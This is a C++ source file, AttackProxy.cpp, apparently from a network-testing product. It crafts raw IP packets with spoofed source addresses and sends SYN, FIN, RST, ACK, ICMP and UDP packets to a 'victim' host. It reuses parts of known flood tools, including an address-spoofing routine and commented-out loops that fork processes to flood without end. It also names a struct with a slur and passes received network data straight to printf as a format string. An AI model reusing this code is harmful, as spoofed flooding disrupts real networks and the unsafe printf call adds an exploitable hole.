////////////////////////////////////////////////////////////////////////////
//
// Copyright (C) 2005
// Packet Engineering, Inc. All rights reserved.
//
// Redistribution and use in source and binary forms, with or without
// modification is not permitted unless authorized in writing by a duly
// appointed officer of Packet Engineering, Inc. or its derivatives
//
// File Name: AttackProxy.cpp
// Description:
//   
//
// Modification History:
// 
////////////////////////////////////////////////////////////////////////////


#include "AttackProxy.h" 

int rawsock;
int psize = 0;
int kiddie = 0, fw00ding = 0, nospoof = 0, pid[CHLD_MAX + 5];
char synb[8192];
struct timespec small = {0, 1337};

unsigned short
ip_sum (u_short *addr, int len)
//     u_short *addr;
//     int len;
{
  register int nleft = len;
  register u_short *w = addr;
  register int sum = 0;
  u_short answer = 0;

  while (nleft > 1)
    {
      sum += *w++;
      nleft -= 2;
    }
  if (nleft == 1)
    {
      *(u_char *) (&answer) = *(u_char *) w;
      sum += answer;
    }
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  answer = ~sum;
  return (answer);
}


u_short
cksum (u_short * buf, int nwords)
{

  unsigned long sum;

  for (sum = 0; nwords > 0; nwords--)
    sum += *buf++;
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  return ~sum;
}


int
validip (char *ip)
{
  int a, b, c, d, *x;
  sscanf (ip, "%d.%d.%d.%d", &a, &b, &c, &d);
  x = &a;
  if (*x < 0)
    return 0;
  if (*x > 255)
    return 0;
  x = &b;
  if (*x < 0)
    return 0;
  if (*x > 255)
    return 0;
  x = &c;
  if (*x < 0)
    return 0;
  if (*x > 255)
    return 0;
  x = &d;
  if (*x < 0)
    return 0;
  if (*x > 255)
    return 0;
  sprintf (ip, "%d.%d.%d.%d", a, b, c, d);	// truncate possible garbage data

  return 1;
}


void
send_connect (unsigned long to, unsigned int id, char *data)
{
  char buf[1024];
  struct icmphdr *icmp = (struct icmphdr *) buf;
  char *bla = (buf + sizeof (struct icmphdr));
  struct sockaddr_in sa;
  int i, ssock;

  ssock = socket (AF_INET, SOCK_RAW, 1);
  bzero (buf, 1024);
  icmp->type = 0;
  icmp->un.echo.id = htons (id);
  strncpy (bla, data, 900);
  icmp->checksum = cksum ((u_short *) icmp, (9 + strlen (data)) >> 1);
  sa.sin_family = AF_INET;
  sa.sin_port = 0;
  sa.sin_addr.s_addr = to;
  i = sendto (ssock, buf, (9 + strlen (data)), 0, (struct sockaddr *) &sa, sizeof (sa));
  close (ssock);
}


void
show_shit (char *buf)
{
  printf ((buf + sizeof (struct iphdr) + sizeof (struct icmphdr)));
}


inline u_long k00lip (void)
{
  struct in_addr hax0r;
  char convi[16];
  int a, b, c, d;

  u_long myip = 2130706433;     /* 127.0.0.1 host byte ordered */
  int nospoof = 1;
  if (nospoof < 1)
    return (u_long) random ();

  hax0r.s_addr = htonl (myip);

  srandom ((time (NULL) + random () % getpid ()));	/* supreme random leetness */

  sscanf (inet_ntoa (hax0r), "%d.%d.%d.%d", &a, &b, &c, &d);

  if (nospoof < 2)
    b = getrandom (1, 254);
  if (nospoof < 3)
    c = getrandom (1, 254);
  d = getrandom (1, 254);

  sprintf (convi, "%d.%d.%d.%d", a, b, c, d);

  return inet_addr (convi);
}


static void syn (int rawsock, u_long victim, u_long source, u_short port)
{
  int tmplen = 0;
  struct sockaddr_in sin;
  struct iphdr *ih = (struct iphdr *) synb;
  struct tcphdr *th = (struct tcphdr *) (synb + sizeof (struct iphdr));
  srandom ((time (NULL) + random ()));
  ih->version = 4;
  ih->ihl = 5;
  ih->tos = 0x00;
  ih->tot_len = sizeof (ih) + sizeof (th);
  ih->id = htons (random ());
  ih->frag_off = 0;
  ih->ttl = 255;
  ih->protocol = 6;
  ih->check = 0;
  //ih->saddr = k00lip ();
  ih->saddr = source;
  ih->daddr = victim;
  th->source = htons (getrandom (0, 9999));
  if (port > 0)
    th->dest = htons (port);
  else
    th->dest = htons (getrandom (0, 9999));
  th->seq = htonl (random ());
  th->doff = sizeof (th) / 4;
  th->ack_seq = htons (rand ());
  th->res1 = 0;
  th->fin = 0;
  th->syn = 1;
  th->rst = 0;
  th->psh = 0;
  th->ack = 0;
  th->urg = 1;
  th->res2 = 0;
  th->window = htons (65535);
  th->check = 0;
  th->urg_ptr = htons (rand ());
  th->check = ip_sum ((u_short *)synb, (sizeof (struct iphdr) + sizeof (struct tcphdr) + 1) & ~1);
  ih->check = ip_sum ((u_short *)synb, (4 * ih->ihl + sizeof (struct tcphdr) + 1) & ~1);
  sin.sin_addr.s_addr = ih->saddr;
  printf("From the source %s , ", inet_ntoa(sin.sin_addr));
  sin.sin_family = AF_INET;
  sin.sin_port = th->dest;
  sin.sin_addr.s_addr = ih->daddr;
  tmplen = sendto (rawsock, synb, 4 * ih->ihl + sizeof (struct tcphdr), 0, (sockaddr *)&sin, sizeof (sin));
  printf("Send the syn to victim %s , the content len=%d\n", inet_ntoa(sin.sin_addr), tmplen);
  WAITAMOMENT;
}

static void fin (int rawsock, u_long victim, u_long source, u_short port)
{
  int tmplen = 0;
  struct sockaddr_in sin;
  struct iphdr *ih = (struct iphdr *) synb;
  struct tcphdr *th = (struct tcphdr *) (synb + sizeof (struct iphdr));
  srandom ((time (NULL) + random ()));
  ih->version = 4;
  ih->ihl = 5;
  ih->tos = 0x00;
  ih->tot_len = sizeof (ih) + sizeof (th);
  ih->id = htons (random ());
  ih->frag_off = 0;
  ih->ttl = 255;
  ih->protocol = 6;
  ih->check = 0;
  //ih->saddr = k00lip ();
  ih->saddr = source;
  ih->daddr = victim;
  th->source = htons (getrandom (0, 9999));
  if (port > 0)
    th->dest = htons (port);
  else
    th->dest = htons (getrandom (0, 9999));
  th->seq = htonl (random ());
  th->doff = sizeof (th) / 4;
  th->ack_seq = htons (rand ());
  th->res1 = 0;
  th->fin = 1;
  th->syn = 0;
  th->rst = 0;
  th->psh = 0;
  th->ack = 0;
  th->urg = 1;
  th->res2 = 0;
  th->window = htons (65535);
  th->check = 0;
  th->urg_ptr = htons (rand ());
  th->check = ip_sum ((u_short *)synb, (sizeof (struct iphdr) + sizeof (struct tcphdr) + 1) & ~1);
  ih->check = ip_sum ((u_short *)synb, (4 * ih->ihl + sizeof (struct tcphdr) + 1) & ~1);
  sin.sin_addr.s_addr = ih->saddr;
  printf("From the source %s , ", inet_ntoa(sin.sin_addr));
  sin.sin_family = AF_INET;
  sin.sin_port = th->dest;
  sin.sin_addr.s_addr = ih->daddr;
  tmplen = sendto (rawsock, synb, 4 * ih->ihl + sizeof (struct tcphdr), 0, (sockaddr *)&sin, sizeof (sin));
  printf("Send the fin to victim %s , the content len=%d\n", inet_ntoa(sin.sin_addr), tmplen);
  WAITAMOMENT;
}


static void rst (int rawsock, u_long victim, u_long source, u_short port)
{
  int tmplen = 0;
  struct sockaddr_in sin;
  struct iphdr *ih = (struct iphdr *) synb;
  struct tcphdr *th = (struct tcphdr *) (synb + sizeof (struct iphdr));
  srandom ((time (NULL) + random ()));
  ih->version = 4;
  ih->ihl = 5;
  ih->tos = 0x00;
  ih->tot_len = sizeof (ih) + sizeof (th);
  ih->id = htons (random ());
  ih->frag_off = 0;
  ih->ttl = 255;
  ih->protocol = 6;
  ih->check = 0;
  //ih->saddr = k00lip ();
  ih->saddr = source;
  ih->daddr = victim;
  th->source = htons (getrandom (0, 9999));
  if (port > 0)
    th->dest = htons (port);
  else
    th->dest = htons (getrandom (0, 9999));
  th->seq = htonl (random ());
  th->doff = sizeof (th) / 4;
  th->ack_seq = htons (rand ());
  th->res1 = 0;
  th->fin = 0;
  th->syn = 0;
  th->rst = 1;
  th->psh = 0;
  th->ack = 0;
  th->urg = 1;
  th->res2 = 0;
  th->window = htons (65535);
  th->check = 0;
  th->urg_ptr = htons (rand ());
  th->check = ip_sum ((u_short *)synb, (sizeof (struct iphdr) + sizeof (struct tcphdr) + 1) & ~1);
  ih->check = ip_sum ((u_short *)synb, (4 * ih->ihl + sizeof (struct tcphdr) + 1) & ~1);
  sin.sin_addr.s_addr = ih->saddr;
  printf("From the source %s , ", inet_ntoa(sin.sin_addr));
  sin.sin_family = AF_INET;
  sin.sin_port = th->dest;
  sin.sin_addr.s_addr = ih->daddr;
  tmplen = sendto (rawsock, synb, 4 * ih->ihl + sizeof (struct tcphdr), 0, (sockaddr *)&sin, sizeof (sin));
  printf("Send the rst to victim %s , the content len=%d\n", inet_ntoa(sin.sin_addr), tmplen);
  WAITAMOMENT;
}


static void ack (int rawsock, u_long victim, u_long source, u_short port)
{
  int tmplen = 0;
  struct sockaddr_in sin;
  struct iphdr *ih = (struct iphdr *) synb;
  struct tcphdr *th = (struct tcphdr *) (synb + sizeof (struct iphdr));
  srandom ((time (NULL) + random ()));
  ih->version = 4;
  ih->ihl = 5;
  ih->tos = 0x00;
  ih->tot_len = sizeof (ih) + sizeof (th);
  ih->id = htons (random ());
  ih->frag_off = 0;
  ih->ttl = 255;
  ih->protocol = 6;
  ih->check = 0;
  //ih->saddr = k00lip ();
  ih->saddr = source;
  ih->daddr = victim;
  th->source = htons (getrandom (0, 9999));
  if (port > 0)
    th->dest = htons (port);
  else
    th->dest = htons (getrandom (0, 9999));
  th->seq = htonl (random ());
  th->doff = sizeof (th) / 4;
  th->ack_seq = htons (rand ());
  th->res1 = 0;
  th->fin = 0;
  th->syn = 0;
  th->rst = 0;
  th->psh = 0;
  th->ack = 1;
  th->urg = 1;
  th->res2 = 0;
  th->window = htons (65535);
  th->check = 0;
  th->urg_ptr = htons (rand ());
  th->check = ip_sum ((u_short *)synb, (sizeof (struct iphdr) + sizeof (struct tcphdr) + 1) & ~1);
  ih->check = ip_sum ((u_short *)synb, (4 * ih->ihl + sizeof (struct tcphdr) + 1) & ~1);
  sin.sin_addr.s_addr = ih->saddr;
  printf("From the source %s , ", inet_ntoa(sin.sin_addr));
  sin.sin_family = AF_INET;
  sin.sin_port = th->dest;
  sin.sin_addr.s_addr = ih->daddr;
  tmplen = sendto (rawsock, synb, 4 * ih->ihl + sizeof (struct tcphdr), 0, (sockaddr *)&sin, sizeof (sin));
  printf("Send the ack to victim %s , the content len=%d\n", inet_ntoa(sin.sin_addr), tmplen);
  WAITAMOMENT;
}


static void icmp (int rawsock, u_long victim, u_long source)
{
  int tmplen;
  struct sockaddr_in sin;
  struct iphdr *ih;
  struct icmphdr *icmp;
  char *packet;
  int pktsize = sizeof (struct iphdr) + sizeof (struct icmphdr) + 64;

  if(psize)
	  pktsize += psize;
  
  srandom ((time (NULL) + random ()));
  packet = (char *) malloc (pktsize);
  ih = (struct iphdr *) packet;
  icmp = (struct icmphdr *) (packet + sizeof (struct iphdr));
  memset (packet, 0, pktsize);

  ih->version = 4;
  ih->ihl = 5;
  ih->tos = 0x00;
  ih->tot_len = htons(pktsize);
  ih->id = htons (getpid());
  ih->frag_off = 0;
  ih->ttl = 255;
  ih->protocol = IPPROTO_ICMP;
  ih->check = 0;
  //ih->saddr = k00lip ();
  ih->saddr = source;
  ih->daddr = victim;
  icmp->type = ICMP_ECHO;
  icmp->code = 0;
  icmp->checksum = htons(~(ICMP_ECHO << 8));
  
  sin.sin_addr.s_addr = ih->saddr;
  printf("From the source %s , ", inet_ntoa(sin.sin_addr));

  sin.sin_family = AF_INET;
  sin.sin_port = htons(0);
  sin.sin_addr.s_addr = ih->daddr;
  tmplen = sendto (rawsock, packet, pktsize, 0, (sockaddr *)&sin, sizeof (sin));
  free(packet);
  printf("Send the ICMP to victim %s , the content len=%d\n", inet_ntoa(sin.sin_addr), tmplen);
  WAITAMOMENT;
}


static void udp (int rawsock, u_long victim, u_long source, u_short port)
{
  int tmplen;
  int fbi = 1, cia = 9999;
  struct sockaddr_in sin;
  struct
  {
     struct iphdr ip;
     struct udphdr udp;
     //u_char evil[1 + psize];
     u_char evil[111];    //UDP Len
  } 
  faggot;

  int pktsize = sizeof (struct iphdr) + sizeof (struct icmphdr) + 64;

  if(fbi++ > 9999)
    fbi = 1;
  if (cia-- < 1)
  	cia = 9999;
  
  srandom ((time (NULL) + random ()));

  faggot.ip.version = 4;
  faggot.ip.ihl = 5;
  faggot.ip.tos = 0x00;
  faggot.ip.tot_len = htons(pktsize);
  faggot.ip.id = htons (getpid());
  faggot.ip.frag_off = 0;
  faggot.ip.ttl = 255;
  faggot.ip.protocol = IPPROTO_UDP;
  //ih->saddr = k00lip ();
  faggot.ip.saddr = source;
  faggot.ip.daddr = victim;
  faggot.ip.check = ip_sum((u_short *)&faggot.ip, sizeof(faggot.ip));
  
  faggot.udp.source = htons(cia);
  faggot.udp.dest = htons(port);
  faggot.udp.len = htons(sizeof(faggot.udp) + sizeof(faggot.evil));
  
  sin.sin_addr.s_addr = faggot.ip.saddr;
  printf("From the source %s , ", inet_ntoa(sin.sin_addr));

  sin.sin_family = AF_INET;
  //sin.sin_port = htons(0);
  sin.sin_addr.s_addr = faggot.ip.daddr;
  tmplen = sendto (rawsock, &faggot, sizeof(faggot), 0, (sockaddr *)&sin, sizeof (sin));
  printf("Send the UDP to victim %s , the content len=%d\n", inet_ntoa(sin.sin_addr), tmplen);
  WAITAMOMENT;
}


void must_kill_all (void)
{
  	int i;

    for (i = 0; i <= CHLD_MAX - 1; i++)
    {
		#ifdef ATTACKLOG
      	char tmp[100];
      	if (pid[i] < 2)
		break;			/* killing -1 or 0 != fun :) */
		sprintf (tmp, "Killing flood pid (#%d): %d\n", i, pid[i]);
		dbug (tmp);
		kill (pid[i], 9);
		#else
		if (pid[i] < 2)
		break;			/* killing -1 or 0 != fun :) */
		kill (pid[i], 9);
		#endif
	}
}


void commence_syn (char *sip, char *ip, int port)
{
  	u_long resolved = 0;
  	u_long resolved_sip = 0;
	//  	char *parse;
	//  	int i = -1, p;
	/*
  	if ((parse = strtok (ip, DELIMITER)) == NULL)
    {
      fw00ding = 0;
      return;
    }
	*/
    resolved = inet_addr (ip);
    resolved_sip = inet_addr (sip);
	rawsock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
	setsockopt (rawsock, IPPROTO_IP, IP_HDRINCL, "1", sizeof ("1"));
	syn (rawsock, resolved, resolved_sip, port);
	
    //while ((ip!= NULL) && (i++ < CHLD_MAX))
   	/* 
		while ((ip!= NULL) && (i++ < 2))
    {
      	p = fork ();
      	if (!p)
		{
	 	 	rawsock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
	 		setsockopt (rawsock, IPPROTO_IP, IP_HDRINCL, "1", sizeof ("1"));
	  		if (resolved == -1)
	    		exit (0);
	  		while (1)
	    		syn (rawsock, resolved, port);
		}
		//sprintf (tmpbuf, "PID %d forking (#%d), child (%d) attacks %s\n"
		printf ("PID %d forking (#%d), child (%d) attacks %s\n", getpid (), i, p, ip);
    	pid[i] = p;
    	//  parse = strtok (NULL, DELIMITER);
    }
	usleep (1000);
	must_kill_all();
	*/
}

void commence_fin (char *sip, char *ip, int port)
{
  	u_long resolved = 0;
  	u_long resolved_sip = 0;

    resolved = inet_addr (ip);
    resolved_sip = inet_addr (sip);
	rawsock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
	setsockopt (rawsock, IPPROTO_IP, IP_HDRINCL, "1", sizeof ("1"));
	fin (rawsock, resolved, resolved_sip, port);
}


void commence_rst (char *sip, char *ip, int port)
{
  	u_long resolved = 0;
  	u_long resolved_sip = 0;

    resolved = inet_addr (ip);
    resolved_sip = inet_addr (sip);
	rawsock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
	setsockopt (rawsock, IPPROTO_IP, IP_HDRINCL, "1", sizeof ("1"));
	rst (rawsock, resolved, resolved_sip, port);
}


void commence_ack (char *sip, char *ip, int port)
{
  	u_long resolved = 0;
  	u_long resolved_sip = 0;

    resolved = inet_addr (ip);
    resolved_sip = inet_addr (sip);
	rawsock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
	setsockopt (rawsock, IPPROTO_IP, IP_HDRINCL, "1", sizeof ("1"));
	ack (rawsock, resolved, resolved_sip, port);
}


void commence_icmp (char *sip, char *ip)
{
  	u_long resolved = 0;
  	u_long resolved_sip = 0;

    resolved = inet_addr (ip);
    resolved_sip = inet_addr (sip);
	rawsock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
	setsockopt (rawsock, IPPROTO_IP, IP_HDRINCL, "1", sizeof ("1"));
	icmp (rawsock, resolved, resolved_sip);
}


void commence_udp (char *sip, char *ip, int port)
{
  	u_long resolved = 0;
  	u_long resolved_sip = 0;

    resolved = inet_addr (ip);
    resolved_sip = inet_addr (sip);
	rawsock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
	setsockopt (rawsock, IPPROTO_IP, IP_HDRINCL, "1", sizeof ("1"));
	udp (rawsock, resolved, resolved_sip, port);
}


